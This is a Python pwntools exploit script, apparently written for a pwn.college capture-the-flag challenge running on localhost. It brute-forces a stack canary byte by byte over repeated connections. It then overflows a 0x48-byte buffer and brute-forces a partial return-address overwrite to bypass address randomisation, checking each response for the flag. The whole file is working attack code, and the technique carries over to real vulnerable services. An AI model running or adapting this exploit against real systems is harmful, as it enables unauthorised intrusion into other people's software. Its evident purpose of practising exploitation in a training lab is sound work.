from pwn import * 
import sys 
import time

context.log_level = 'debug'
context.log_level = 'warn'

BUFFER_SIZE=0x48
RET_ADDR=0x0b17

def new_conn():
    return remote('localhost', 1337)

def try_bytes(conn, byte_word: bytes):
    payload = cyclic(BUFFER_SIZE) + byte_word
    payload_len = len(payload)
    conn.sendlineafter(b'Payload size: ', str(payload_len).encode())
    conn.clean()
    conn.send(payload)
    conn.recvuntil(b'Goodbye!')

    try: 
        if b'terminated' in conn.recvall():
            return False
        return True
    except EOFError as _:
        conn.interactive()
        exit(1)


if len(sys.argv) <= 1:
    print("./script.py [PROG]")
    exit(1)

canary = b'\x00' if len(sys.argv) < 3 else sys.argv[2].encode()
canary = b'\x00\xf8\xa7\xff\xbd\xbd\x96U'
if not try_bytes(new_conn(), canary):
    print(f"First canary check failed! {canary} {canary[0]}")
    exit(1)

#server = process(sys.argv[1])
if canary == b'\x00':
    for i in range(1, 8):
        for byte in range(2 ** 8):
            with new_conn() as client:
                if try_bytes(client, canary + p8(byte)):
                    canary += p8(byte)
                    break
        print(canary)

        if len(canary) != i + 1:
            print("Error")
            exit(1)

print(f"\nCANARY: {canary}\n")

for nibble in range(16):
    with new_conn() as client:
        payload = cyclic(BUFFER_SIZE) + canary + \
                  cyclic(8) + p16(RET_ADDR + nibble * 0x1000) 
        client.sendlineafter(b'Payload size: ', str(len(payload)).encode())
        client.clean()
        client.send(payload)
        client.recvuntil(b'Goodbye!')
        
        try:
            res = client.recvall()
            if b'pwn.college' in res:
                print(res)
                input()
                break
        except:
            pass

